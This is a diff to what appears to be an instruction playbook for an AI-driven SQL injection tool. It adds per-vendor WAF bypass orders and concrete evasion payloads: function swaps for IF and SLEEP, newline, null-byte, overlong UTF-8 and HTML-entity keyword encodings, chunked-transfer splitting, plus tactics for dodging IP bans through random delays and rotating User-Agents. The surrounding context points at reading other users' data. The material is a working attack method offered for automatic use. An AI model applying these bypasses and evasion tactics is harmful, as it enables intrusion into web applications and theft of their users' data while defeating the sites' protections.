@@ -173,6 +173,51 @@ When recon shows SENSITIVE_FORM_FIELDS DETECTED:
   - Priority 2: Check if data is accessible without auth (IDOR via user enumeration)
   - Priority 3: Try registering and accessing other users' data
 
+=== WAF BYPASS — AI AUTO-SELECT STRATEGY ===
+When WAF detected, auto-select by WAF type:
+
+[Cloudflare]  → encoding (double URL %2527) → unicode → ua → header → function
+[Nginx/OpenResty 406] → newline (%0a) → mysql_comment (/**/) → space → keyword → function
+[ModSecurity] → space (/**/) → function (IF→CASE WHEN) → keyword → encoding → header
+[AWS WAF]     → encoding → function → header → space → keyword
+[Sucuri]      → ua (Googlebot) → header (XFF) → encoding → space
+[Chinese WAF: Safe3/D盾/云锁] → unicode (null byte) → encoding → function → space
+[Generic/Unknown] → space → keyword → header → encoding → function
+
+=== ADVANCED WAF BYPASS TECHNIQUES (NEW) ===
+AI automatically applies when standard techniques fail:
+
+[SQL Function Replacement — blocks IF/SLEEP/BENCHMARK]
+  • IF(a,b,c)   → CASE/**/WHEN/**/a/**/THEN/**/b/**/ELSE/**/c/**/END
+  • SLEEP(n)    → (SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,
+                   information_schema.columns/**/B)   ← heavy query delay
+  • BENCHMARK   → same heavy subquery above
+  • GREATEST(a,b) comparisons instead of = (avoids equality operator detection)
+  • AND/OR      → &&/||  when keyword itself blocked
+  • UNION SELECT → UNION%0aSELECT (newline between keywords)
+
+[Unicode / Encoding Advanced]
+  • Fullwidth chars: ' → \uff07  " → \uff02
+  • Overlong UTF-8: / → %c0%af  (legacy parser confusion)
+  • NULL byte inject: UNION%00SELECT (C-based parser truncation)
+  • HTML entity: S&#69;LECT, UNI&#79;N, AN&#68;
+
+[HTTP Protocol Bypass]
+  • Chunked Transfer: POST body split into 3-7 byte chunks
+    → WAF without body reassembly misses pattern match
+
+[Anti-IP-Ban Strategy]
+  • safe_delay(1.0, 3.5) random sleep between requests
+  • Rotate User-Agent per request
+  • Add random junk GET params to change request fingerprint
+
+=== BYPASS ORDER (when WAF is stubborn) ===
+STEP 1: single technique (per WAF type above)
+STEP 2: combined — space + keyword + header
+STEP 3: advanced combined — function_replace + space + header
+STEP 4: unicode + function_replace combined
+STEP 5: chunked POST (if POST method available)
+
 === CUSTOM WAF (Non-standard HTTP codes) ===
 When recon shows CUSTOM_WAF_DETECTED or HTTP 999:
   - Application-level filter (NOT network WAF)
@@ -184,6 +229,9 @@ When recon shows CUSTOM_WAF_DETECTED or HTTP 999:
     4. Double encoding: %27 → %2527
     5. NULL byte: payload%00
     6. Concatenation: CONCAT(0x61,0x64,0x6d,0x69,0x6e)
+    7. [NEW] IF→CASE WHEN replacement
+    8. [NEW] SLEEP→heavy subquery
+    9. [NEW] Chunked Transfer Encoding
 
 === SCRIPT BUG PREVENTION ===
   WRONG: list.append(a, b, c)          CORRECT: list.append((a, b, c))
